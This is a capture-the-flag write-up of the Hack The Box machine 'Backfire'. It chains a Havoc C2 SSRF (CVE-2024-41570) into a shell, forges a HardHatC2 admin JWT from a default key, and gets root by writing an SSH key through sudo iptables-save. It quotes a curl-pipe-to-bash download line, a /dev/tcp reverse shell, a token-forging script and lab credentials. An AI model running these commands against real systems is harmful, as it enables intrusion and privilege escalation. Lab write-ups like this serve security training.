+++
title = "Backfire - HTB Machine"
date = "2025-06-13"
weight = 0
[taxonomies]
tags=["HTB", "Machine", "C2", "SSRF", "tunneling", "dotnet", "iptables"]
difficulty=["medium"]
writeup=["HTB-machine"]
os=["linux"]
+++


This box revolves around exploiting two C2 frameworks, namely *Havoc* and *HardHatC2*.

# Recon


Starting on with a nmap scan:

```bash
┌──(kali㉿kali)-[~/htb/box/backfire/files]
└─$ cat ../nmap/backfire.nmap  
# Nmap 7.95 scan initiated Thu May 29 18:39:15 2025 as: /usr/lib/nmap/nmap -vv -sC -sV -oA nmap/backfire 10.129.254.154
Nmap scan report for 10.129.254.154
Host is up, received reset ttl 63 (0.020s latency).
Scanned at 2025-05-29 18:39:15 CEST for 16s
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE  REASON              VERSION
22/tcp   open     ssh      syn-ack ttl 63      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuxaL9aCVxiQGLRxQPezW3dkgouskvb/BcBJR16VYjHElq7F8C2ByzUTNr0OMeiwft8X5vJaD9GBqoEul4D1QE=
|   256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2oT7Hn4aUiSdg4vO9rJIbVSVKcOVKozd838ZStpwj8
443/tcp  open     ssl/http syn-ack ttl 63      nginx 1.22.1
|_http-server-header: nginx/1.22.1
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=127.0.0.1/stateOrProvinceName=/countryName=US/streetAddress=/postalCode=7317/localityName=
| Subject Alternative Name: IP Address:127.0.0.1
| Issuer: commonName=127.0.0.1/stateOrProvinceName=/countryName=US/streetAddress=/postalCode=7317/localityName=
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-31T16:37:53
| Not valid after:  2027-07-31T16:37:53
| MD5:   3419:025f:eff8:2c83:c6bf:7b99:0a9f:f4d5
| SHA-1: cbaf:1aed:eedf:4d8c:80d1:1c83:60c8:2bd7:084f:575e
| -----BEGIN CERTIFICATE-----
| MIIDnjCCAoagAwIBAgIQY4TI4vHtrgsCl7PraF25aDANBgkqhkiG9w0BAQsFADBR
..................................................................
..................................................................
| 6j6JZRb1b97Ksrb816fE5SAc
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_http-title: 404 Not Found
5000/tcp filtered upnp     port-unreach ttl 63
8000/tcp open     http     syn-ack ttl 63      nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 12:31  disable_tls.patch
| 875   17-Dec-2024 12:34  havoc.yaotl
|_
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 29 18:39:31 2025 -- 1 IP address (1 host up) scanned in 16.54 seconds
```

We have the services:

- `ssh` on port 22
- `ssl/http` on port 443
- Some service on port 5000
- `http` on port 8000


# Foothold 


We can see that on website on port 8000, we have some a file directory listing:

```html
└─$ curl http://10.129.254.154:8000
<html>
<head><title>Index of /</title></head>
<body>
<h1>Index of /</h1><hr><pre><a href="../">../</a>
<a href="disable_tls.patch">disable_tls.patch</a>      17-Dec-2024 12:31    1559
<a href="havoc.yaotl">havoc.yaotl</a>                  17-Dec-2024 12:34     875
</pre><hr></body>
</html>
```


Looking at the `disable_tls.patch` file, we are provided with a a comment and a patch file.


**disable_tls.patch:**
```diff
Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so 
this will not compromize our teamserver

diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
index abdf1b5..6be76fb 100644
--- a/client/src/Havoc/Connector.cc
+++ b/client/src/Havoc/Connector.cc
@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
 {
     Teamserver   = ConnectionInfo;
     Socket       = new QWebSocket();
-    auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+    auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
     auto SslConf = Socket->sslConfiguration();
 
     /* ignore annoying SSL errors */
     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
-    Socket->setSslConfiguration( SslConf );
     Socket->ignoreSslErrors();
 
     QObject::connect( Socket, &QWebSocket::binaryMessageReceived, this, [&]( const QByteArray& Message )
diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
index 9d1c21f..59d350d 100644
--- a/teamserver/cmd/server/teamserver.go
+++ b/teamserver/cmd/server/teamserver.go
@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
 		}
 
 		// start the teamserver
-		if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+		if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
 			logger.Error("Failed to start websocket: " + err.Error())
 		}
```

Key points:

- There is most likely running a instance of the [Havoc](https://github.com/HavocFramework/Havoc) C2 framework on the box. (A Teamserver, which for `Havoc` is the server)
- TLS for the websocket port `40056` is disabled. 
- `ssh` forwarding is used.
- *sergej* is lazy.



We also have a config file for *havoc*: **havoc.yaotl** 

```json
└─$ cat havoc.yaotl 
Teamserver {
    Host = "127.0.0.1"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1" 
        PortBind = 8443 
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}
```

Key points:
- Credentials: `ilya:CobaltStr1keSuckz` and `sergej:w4nt2sw1tch2h4rdh4tc2`
- Some local ports: 8443, 40056

## Unauthenticated SSRF - CVE

Trying to use the credentials with `ssh` amounts to nothing. 

Searching for vulnerabilities on *Havoc* I found this blog post [SSRF on Havoc C2](https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/). The post explains the CVE: **CVE-2024-41570** and is authored by one of the machine authors: *chebuya* 

In the interest of time I found a POC for the CVE: [CVE-2024-41570-Havoc-C2-RCE](https://github.com/thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE) 

Before being able to run the exploit you have to change the Ip and ports for the exploit to work:
```bash
└─$ grep -ri "change" exploit.py payload.sh 
exploit.py:USER = "USERNAME" # CHANGE THIS
exploit.py:PASSWORD = "PASSWORD" # CHANGE THIS
exploit.py:host = "<IP>" # CHANGE THIS
exploit.py:port = <PORT> # CHANGE THIS
exploit.py:cmd = "curl http://<IP>:<PORT>/payload.sh | bash" # CHANGE THE IP AND THE PORT
payload.sh:bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 # CHANGE THIS
```

You can can see a demo of the attack below:
{{ note(clickable=true, hidden=true, header="Demo of the attack", body="![POC of the exploit](https://private-user-images.githubusercontent.com/179417827/404711378-e57accee-6d1e-4633-aa32-a0ee07c42988.gif?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NDk4MTk4MjcsIm5iZiI6MTc0OTgxOTUyNywicGF0aCI6Ii8xNzk0MTc4MjcvNDA0NzExMzc4LWU1N2FjY2VlLTZkMWUtNDYzMy1hYTMyLWEwZWUwN2M0Mjk4OC5naWY_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjEzJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxM1QxMjU4NDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03YTVmYjk3MDRmMjU2ZTMwNjUyMDZjOWU2MzcxNjg5Y2Y0YTQ3MmVmNGE4Y2Y0ZDg3ZDdlMjFjNzc3YjUzMWE2JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9._7o3j1ZRAunxxgAOnHItHN2ln0ABBCP5GnDwedrOzEY) ") }}


# Shell as ilya

Essentially, you run:
- A http server to serve you payload to the victim: `python -m http.server 80`
- A `nc` listener waiting for the reverse shell calling back: `nc -lnvp 9001`

Then to execute the exploit, you need the port and the internal ip address, which we got from the leaked files earlier.

So running:
```bash
└─$ python exploit.py -t https://10.129.254.154 -i 127.0.0.1 -p 40056 
[+] Registering agent...
[+] Opening socket...
[+] Writing socket...
```

Gets us a shell as `ilya`.

```bash
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.167] from (UNKNOWN) [10.129.254.154] 42792
bash: cannot set terminal process group (35544): Inappropriate ioctl for device
bash: no job control in this shell
ilya@backfire:~/Havoc/payloads/Demon$ cd /home
ilya@backfire:/home$ ls
ls
ilya
sergej
ilya@backfire:/home$ cd ilya
cd ilya
ilya@backfire:~$ ls
ls
files
hardhat.txt
Havoc
user.txt
ilya@backfire:~$ cat u*
cat u*
b..............................5
```

However this shell is quite short lived, so I went and got a `ssh` connection:

```bash
ilya@backfire:~/Havoc/payloads/Demon$ cd 
ilya@backfire:~$ cd .ssh
ilya@backfire:~/.ssh$ echo "ssh-ed25519 AAAAC......xk some_user@mymail.com" >> authorized_keys
```

## Exploiting HardHatC2

Looking at the files in ilyas home, we find that `sergej` probably is using [HardHatC2](https://github.com/DragoQCC/CrucibleC2) 

```
ilya@backfire:~$ cat hardhat.txt 
Sergej said he installed HardHatC2 for testing and  not made any changes to the defaults
I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go > C# 
```

# Shell as sergej

I install hardhat, which is not need at this point but will be nice later!

So installing the right dotnet version to build *HardHatC2*:

```bash
└─$ ./dotnet-install.sh --channel 7.0
dotnet-install: Attempting to download using aka.ms link https://builds.dotnet.microsoft.com/dotnet/Sdk/7.0.410/dotnet-sdk-7.0.410-linux-x64.tar.gz
dotnet-install: Remote file https://builds.dotnet.microsoft.com/dotnet/Sdk/7.0.410/dotnet-sdk-7.0.410-linux-x64.tar.gz size is 218499912 bytes.
dotnet-install: Extracting archive from https://builds.dotnet.microsoft.com/dotnet/Sdk/7.0.410/dotnet-sdk-7.0.410-linux-x64.tar.gz
dotnet-install: Downloaded file size is 218499912 bytes.
dotnet-install: The remote and local file sizes are equal.
dotnet-install: Installed version is 7.0.410
dotnet-install: Adding to current process PATH: `/home/kali/.dotnet`. Note: This change will be visible only when sourcing script.
dotnet-install: Note that the script does not resolve dependencies during installation.
dotnet-install: To check the list of dependencies, go to https://learn.microsoft.com/dotnet/core/install, select your operating system and check the "Dependencies" section.
dotnet-install: Installation finished successfully.
```

I try to run it to see how it behaves.

```bash
└─$ /home/kali/.dotnet/dotnet run  --project TeamServer 
Building...
...
...
...
Unzipping build tools
Unzipping build tools complete
Plugins loaded
TeamServer is running in development mode.
TeamServer is running on https://0.0.0.0:5000
Initiating SQLite server
Connecting to database
Connected to sqlite server
Creating tables
Creating default roles
Creating default admin
info: Microsoft.Hosting.Lifetime[14]
      Now listening on: https://0.0.0.0:5000
info: Microsoft.Hosting.Lifetime[0]
      Application started. Press Ctrl+C to shut down.
info: Microsoft.Hosting.Lifetime[0]
      Hosting environment: Development
info: Microsoft.Hosting.Lifetime[0]
      Content root path: /home/kali/htb/box/backfire/hardhat/CrucibleC2/TeamServer
[**] HardHat_Admin's password is ^GqkH?w1n!UyE!$85dZw, make sure to save this password, as on the next start of the server it will not be displayed again [**]
[**] Default admin account; SAVE THIS PASSWORD; it will not be displayed again [**]
    Username: HardHat_Admin
    Password: ^GqkH?w1n!UyE!$85dZw
Filling teamserver from database
restored 0 implants from the database
Generating unique encryption keys for pathing and metadata id
```

we can see that the admin credentials are generated once upon setup. However, I tried grepping for it all on the box and found nothing.

I also found some creds:
```bash
ilya@backfire:~/Havoc/data$ cat havoc.yaotl 
...
	user "5pider" {
		Password = "password1234"
	}

	user "Neo" {
		Password = "password1234"
	}
}
...
```
but just seemed to be dummy passwords.

So forwarding the port to me:
```bash
└─$ ssh -L 7096:localhost:7096 ilya@backfire.htb 
```

I can then then visit https://localhost:7096/

However, I have no valid credentials, but thinking back on the note, we know that sergej are running the server with the default configuration. 

In my experience it is convention to store the secrets in an `appsettings.json` when developing in C#.

Which we can find in a couple of different ways. So on my local installation i ran:
```bash
┌──(kali㉿kali)-[~/…/box/backfire/hardhat/CrucibleC2]
└─$ grep -ri "jwt" . --context 1 | grep appsettings
.... SNIP ....
./TeamServer/bin/Debug/net7.0/appsettings.json-  "AllowedHosts": "*",
./TeamServer/bin/Debug/net7.0/appsettings.json:  "Jwt": {
./TeamServer/bin/Debug/net7.0/appsettings.json-    "Key": "jtee43gt-6543-2iur-9422-83r5w27hgzaq",
./TeamServer/appsettings.json-  "AllowedHosts": "*",
./TeamServer/appsettings.json:  "Jwt": {
./TeamServer/appsettings.json-    "Key": "jtee43gt-6543-2iur-9422-83r5w27hgzaq",
```
Or in a more clean fashion:

```bash
┌──(kali㉿kali)-[~/…/box/backfire/hardhat/CrucibleC2]
└─$ find . -name *appsettings.json -exec grep -i "jwt" --context 1 {} \;
  "AllowedHosts": "*",
  "Jwt": {
    "Key": "jtee43gt-6543-2iur-9422-83r5w27hgzaq",
  "AllowedHosts": "*",
  "Jwt": {
    "Key": "jtee43gt-6543-2iur-9422-83r5w27hgzaq",
```

However I did not know what the claims of the JWT was supposed to be. So I dug and found this article: [HardHatC2 0-Days (RCE & AuthN Bypass)](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7) 

To generate the JWT I modified the scrip from the article:

```python
import jwt
import datetime
import uuid
import requests

# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)
```

which gives something like: 

```
Generated JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJIYXJkSGF0X0FkbWluIiwianRpIjoiMjNmMDJiOGEtOTNiOS00NWYwLTkyMDQtM2I1YjlkNzY2YTJhIiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvbmFtZWlkZW50aWZpZXIiOiIxIiwiaXNzIjoiaGFyZGhhdGMyLmNvbSIsImF1ZCI6ImhhcmRoYXRjMi5jb20iLCJpYXQiOjE3NDg1OTM0NDQsImV4cCI6MTc1MTAxMjY0NCwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiQWRtaW5pc3RyYXRvciJ9.vbG7RmL1k1zj9FxNTKRpzmHoHaRCWuLMzRNU92wDSRg
```

I could not figure out how to include in a header or as a cookie in firefox. It proved usefull that I had earlier built the service locally, so I logged in as `HardHat_Admin` with the credentials from build log. I then discovered that the JWT was stored in local storage(In hindsight this is common for C# and/or Blazor Apllications).

I had to set:
- `UserName: HardHat_Admin`
- `bearerToken: ey......`

Refreshing the page authenticates us, and we are shown the *Admin Dashboard*. There is not much we can do on this page, but create a new user or webhook.

Creating a new user and giving it the *Role* **TeadLead** allows os to perform more actions than as the admin user.

Like with a CMS-site, I tried to see if there was some kind of extension I could install to get code execution. However, with this being a C2 framework, there is a dedicated *"terminal"* tab. 

So heading to the *implant* section/subpage: `https://localhost:7096/ImplantInteract`, there is an embedded terminal terminal.

Running a quick `id` in the terminal pane returns `sergej`. To escalate our privilege to the `sergej` user I do the same thing of appending my public key to the `authorized_keys` in the `/home/sergej/.ssh/` directory.


# Root


```bash
┌──(kali㉿kali)-[~/htb/box/backfire/files]
└─$ ssh sergej@backfire.htb           

Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Sep 28 22:44:34 2024 from 10.10.14.167
sergej@backfire:~$ 
```

## Exploiting `iptables` to write files


Seeing if `sergej` run anything special as root:

```bash
sergej@backfire:~$ sudo -l
Matching Defaults entries for sergej on backfire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save
```

To exploit both `iptables` and `iptables-save` I found this article: [A Journey From sudo iptables To Local Privilege Escalation](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/) 

I first attempt to overwrite the password for root, as described in the article, but it does not end up working, as i get this error:

```bash
sergej@backfire:~$ sudo /usr/sbin/iptables-save -f /etc/passwd
Failed to open file, error: Operation not permitted
```

Failling back to what I did at each step of escalation in this box, I try to append my public key to the `authorized_keys` for root:

```bash
sergej@backfire:~$ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAA.........................................................249S1xk something@mail.com\n'
sergej@backfire:~$ sudo /usr/sbin/iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i lo -m comment --comment "
ssh-ed25519 AAAA.........................................................249S1xk something@mail.com
" -j ACCEPT
```

Saving the file:

```bash
sergej@backfire:~$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```

And then connecting with `ssh`:

```bash
┌──(kali㉿kali)-[~/htb/box/backfire]
└─$ ssh root@backfire.htb         
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
root@backfire:~# wc root.txt 
 1  1 33 root.txt
```


# Misc

## Tools 
- `nmap`
- `Havoc`
- `HardHatC2`
- `iptables`
- `ssh` (tunneling)
- `dotnet`
